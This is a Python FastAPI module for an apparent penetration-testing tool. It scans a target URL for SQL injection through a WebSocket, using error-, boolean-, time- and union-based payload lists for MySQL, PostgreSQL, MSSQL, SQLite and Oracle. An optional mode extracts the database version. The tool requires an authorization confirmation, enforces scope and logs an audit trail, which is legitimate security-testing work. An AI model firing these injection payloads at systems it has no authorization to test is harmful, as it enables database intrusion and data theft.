"""SQL Injection — error / boolean / time / union detection.

WS  /ws/sqli
    client -> server:
        {"url":"...FUZZ...", "method","body","headers","cookies",
         "methods":["error","boolean","time","union"],
         "allow_private":false, "rate_per_sec":4,
         "exploit": false,   # if true, fetch DBMS version + table list
         "confirm_auth": true}

    server -> client (same envelope as XSS; finding includes "method","dbms")
"""
from __future__ import annotations

import asyncio
import logging
import re
import time

from urllib.parse import urlparse

from fastapi import APIRouter, WebSocket, WebSocketDisconnect

from lib import audit_log, scope, web_fuzz
from lib.errors import ErrorCode, MhpError, ws_error
from lib.mode import get_mode
from lib.validators import validate_url

logger = logging.getLogger(__name__)

router = APIRouter(tags=["sqli"])

# DB-specific error signatures
DB_ERRORS: dict[str, list[str]] = {
    "mysql": [
        r"you have an error in your sql syntax",
        r"warning.*mysql_",
        r"mysql_fetch_array",
        r"check the manual that corresponds to your (mysql|mariadb)",
        r"unknown column",
    ],
    "postgresql": [
        r"pg_query\(\)",
        r"postgresql.*error",
        r"unterminated quoted string",
        r"syntax error at or near",
    ],
    "mssql": [
        r"microsoft sql server",
        r"unclosed quotation mark",
        r"incorrect syntax near",
        r"odbc.*sql server",
        r"\[sqlserver\]",
    ],
    "sqlite": [
        r"sqlite_(error|exception)",
        r"sqlite3\.OperationalError",
        r"unrecognized token",
    ],
    "oracle": [
        r"ora-\d{5}",
        r"oracle.*driver",
        r"plsql\.",
    ],
}

ERROR_PAYLOADS = ["'", "\"", "')", "\")", "' --", "' OR '1'='1", "' AND 1=CONVERT(int,@@version)--"]
BOOLEAN_TRUE  = ["' AND 1=1-- -", "\" AND 1=1-- -", "' OR '1'='1' -- ", " AND 1=1"]
BOOLEAN_FALSE = ["' AND 1=2-- -", "\" AND 1=2-- -", "' OR '1'='2' -- ", " AND 1=2"]
TIME_PAYLOADS = {
    "mysql":      "' AND SLEEP({d})-- -",
    "postgresql": "'; SELECT pg_sleep({d})-- ",
    "mssql":      "'; WAITFOR DELAY '0:0:{d}'-- ",
    "sqlite":     "' AND RANDOMBLOB({n})-- ",   # CPU-bound
    "oracle":     "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{d})-- ",
}

VERSION_QUERIES = {
    "mysql":      "' UNION SELECT NULL,@@version-- -",
    "postgresql": "' UNION SELECT NULL,version()-- ",
    "mssql":      "' UNION SELECT NULL,@@version-- ",
    "sqlite":     "' UNION SELECT NULL,sqlite_version()-- ",
    "oracle":     "' UNION SELECT NULL,banner FROM v$version-- ",
}


def detect_dbms(body: str) -> str | None:
    for db, patterns in DB_ERRORS.items():
        if web_fuzz.regex_first(body, patterns):
            return db
    return None


@router.websocket("/ws/sqli")
async def sqli_ws(ws: WebSocket) -> None:
    await ws.accept()
    stop = asyncio.Event()
    audit_id: str | None = None

    async def listen_for_stop() -> None:
        try:
            while True:
                msg = await ws.receive_json()
                if isinstance(msg, dict) and msg.get("action") == "stop":
                    stop.set(); return
        except Exception:
            stop.set()

    try:
        init = await ws.receive_json()
        engagement_id = init.get("engagement_id") or None
        url = str(init.get("url", "")).strip()
        try:
            url = validate_url(url, field="url")
        except MhpError as exc:
            await ws.send_json(ws_error(exc.code, exc.message))
            await ws.close(); return
        tmpl = web_fuzz.FuzzTemplate(
            url=url,
            method=str(init.get("method", "GET")).upper(),
            body=str(init.get("body", "")),
            headers=dict(init.get("headers") or {}),
            cookies=dict(init.get("cookies") or {}),
        )
        if not tmpl.has_marker():
            await ws.send_json(ws_error(
                ErrorCode.BAD_REQUEST,
                f"Place '{web_fuzz.DEFAULT_MARKER}' where payloads should go",
            ))
            await ws.close(); return
        if not bool(init.get("confirm_auth", False)):
            await ws.send_json(ws_error(
                ErrorCode.NEED_CONFIRM,
                "Confirm you have authorization to test this target before running",
            ))
            await ws.close(); return

        confirm = bool(init.get("confirm", False))
        init_mode = str(init.get("mode", "")).strip().lower()
        mode = "engagement" if init_mode == "engagement" else (
            "lab" if init_mode == "lab" else get_mode(ws)
        )
        host_for_scope = urlparse(url).hostname or url
        if not await scope.enforce_ws(ws, host_for_scope, engagement_id, mode, confirm=confirm, active=True, action="sqli"):
            return

        allow_private = bool(init.get("allow_private", False))
        ok, reason = web_fuzz.check_scope(url, allow_private)
        if not ok:
            await ws.send_json(ws_error(ErrorCode.TARGET_DENIED, reason))
            await ws.close(); return

        methods = list(init.get("methods") or ["error", "boolean", "time"])
        rate = max(1, min(int(init.get("rate_per_sec", 4)), 20))
        do_exploit = bool(init.get("exploit", False))

        # Baseline
        base = await web_fuzz.baseline(tmpl)
        try:
            audit_id = audit_log.start(
                tool="sqli", target=url,
                argv=[tmpl.method, url, f"modes={','.join(methods)}",
                      f"exploit={do_exploit}", f"rate={rate}/s"],
                engagement_id=engagement_id,
            )
        except Exception:
            logger.exception("audit_log.start failed (scan continues)")

        await ws.send_json({
            "type": "started", "url": url, "methods": methods,
            "baseline": {"status": base.status, "length": base.length,
                         "elapsed_ms": base.elapsed_ms},
            "audit_id": audit_id,
        })

        listener = asyncio.create_task(listen_for_stop())
        t0 = time.monotonic()
        findings = 0
        detected_dbms: str | None = None

        # ── Error-based ─────────────────────────────────────────────────────
        if "error" in methods and not stop.is_set():
            async def on_err(r: web_fuzz.FuzzResponse) -> None:
                nonlocal findings, detected_dbms
                await ws.send_json({"type": "attempt", "method": "error",
                                    "payload": r.payload, "status": r.status,
                                    "length": r.length, "elapsed_ms": r.elapsed_ms})
                dbms = detect_dbms(r.body)
                if dbms:
                    detected_dbms = detected_dbms or dbms
                    findings += 1
                    snippet = web_fuzz.regex_first(r.body, DB_ERRORS[dbms]) or ""
                    await ws.send_json({
                        "type": "finding", "severity": "high",
                        "method": "error", "dbms": dbms,
                        "payload": r.payload, "evidence": snippet,
                        "confirmed": True,
                    })
            await web_fuzz.run_payloads(tmpl, ERROR_PAYLOADS, on_err,
                                        concurrency=3, rate_per_sec=rate, stop=stop)

        # ── Boolean-based ───────────────────────────────────────────────────
        if "boolean" in methods and not stop.is_set():
            for tp, fp in zip(BOOLEAN_TRUE, BOOLEAN_FALSE):
                if stop.is_set():
                    break
                tr = await web_fuzz.baseline(tmpl, sentinel=tp)
                fr = await web_fuzz.baseline(tmpl, sentinel=fp)
                diff_tf = web_fuzz.length_diff_pct(tr.length, fr.length)
                diff_tb = web_fuzz.length_diff_pct(tr.length, base.length)
                await ws.send_json({"type": "attempt", "method": "boolean",
                                    "payload": f"TRUE={tp!r} / FALSE={fp!r}",
                                    "status": tr.status, "length": tr.length,
                                    "elapsed_ms": tr.elapsed_ms})
                # TRUE should look ~= baseline; FALSE should differ noticeably
                if diff_tb < 3.0 and diff_tf > 8.0:
                    findings += 1
                    await ws.send_json({
                        "type": "finding", "severity": "high", "method": "boolean",
                        "payload": tp,
                        "evidence": f"TRUE len={tr.length} matches baseline ({base.length}); "
                                    f"FALSE len={fr.length} differs by {diff_tf:.1f}%",
                        "confirmed": True,
                    })
                    break

        # ── Time-based ──────────────────────────────────────────────────────
        if "time" in methods and not stop.is_set():
            for db, tpl in TIME_PAYLOADS.items():
                if stop.is_set():
                    break
                p = tpl.format(d=5, n=200_000_000)
                r = await web_fuzz.baseline(tmpl, sentinel=p, timeout=12.0)
                await ws.send_json({"type": "attempt", "method": "time",
                                    "payload": p, "status": r.status,
                                    "length": r.length, "elapsed_ms": r.elapsed_ms})
                if r.elapsed_ms >= 4500 and r.elapsed_ms < 12000 and base.elapsed_ms < 3000:
                    detected_dbms = detected_dbms or db
                    findings += 1
                    await ws.send_json({
                        "type": "finding", "severity": "high", "method": "time",
                        "dbms": db, "payload": p,
                        "evidence": f"sleep payload caused {r.elapsed_ms} ms vs baseline {base.elapsed_ms} ms",
                        "confirmed": True,
                    })
                    break

        # ── Union-based (lightweight column-count probe) ────────────────────
        if "union" in methods and not stop.is_set():
            for n in range(1, 9):
                if stop.is_set():
                    break
                cols = ",".join(["NULL"] * n)
                p = f"' UNION SELECT {cols}-- -"
                r = await web_fuzz.baseline(tmpl, sentinel=p)
                await ws.send_json({"type": "attempt", "method": "union",
                                    "payload": p, "status": r.status,
                                    "length": r.length, "elapsed_ms": r.elapsed_ms})
                if r.status and r.status < 500 and \
                        web_fuzz.length_diff_pct(r.length, base.length) < 10.0:
                    findings += 1
                    await ws.send_json({
                        "type": "finding", "severity": "warn", "method": "union",
                        "payload": p,
                        "evidence": f"UNION with {n} cols returned 200-like ({r.status})",
                        "confirmed": False,
                    })
                    break

        # ── Exploit: extract DBMS version ───────────────────────────────────
        if do_exploit and detected_dbms and not stop.is_set():
            q = VERSION_QUERIES.get(detected_dbms)
            if q:
                r = await web_fuzz.baseline(tmpl, sentinel=q)
                # crude — surface response body so user can pull version out
                await ws.send_json({
                    "type": "finding", "severity": "high",
                    "method": "exploit", "dbms": detected_dbms,
                    "payload": q,
                    "evidence": r.body[:1000],
                    "confirmed": True,
                })

        listener.cancel()
        elapsed = round(time.monotonic() - t0, 2)
        await ws.send_json({"type": "done", "elapsed": elapsed,
                            "findings": findings, "dbms": detected_dbms,
                            "stopped": stop.is_set()})
        if audit_id:
            summary = (f"{findings} findings"
                       + (f" ({detected_dbms})" if detected_dbms else "")
                       + f", {elapsed}s")
            try:
                if stop.is_set():
                    audit_log.stopped(audit_id, summary=summary)
                else:
                    audit_log.complete(audit_id, summary=summary)
            except Exception:
                logger.exception("audit_log finalize failed")
    except WebSocketDisconnect:
        stop.set()
        if audit_id:
            try: audit_log.stopped(audit_id, summary="client disconnected")
            except Exception: pass
    except Exception as exc:
        logger.exception("sqli_ws unhandled exception")
        if audit_id:
            try: audit_log.error(audit_id, f"{type(exc).__name__}: {exc}")
            except Exception: pass
        try:
            await ws.send_json(ws_error(
                ErrorCode.INTERNAL,
                "internal error during SQL-injection scan",
            ))
        except Exception:
            pass
    finally:
        try:
            await ws.close()
        except Exception:
            pass
